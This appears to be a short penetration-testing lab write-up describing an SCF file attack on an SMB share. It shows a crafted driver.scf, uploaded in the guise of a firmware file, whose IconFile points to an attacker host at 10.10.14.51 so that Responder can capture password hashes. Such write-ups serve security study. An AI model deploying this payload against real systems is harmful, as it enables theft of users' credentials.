SCF file attack on SMB Share

One possible attack path is to use responder to steal some hashes after uploading a file with a reference to our attacker machine: \\10.10.14.51\shares\whateverfile

Let’s first craft a Shell Command File (SCF) that we will upload as a firmware file. The SCF File Attack on SMB shares is described in detail on this blog: https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

$ cat driver.scf
[Shell]
Command=2
IconFile=\\10.10.14.51\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
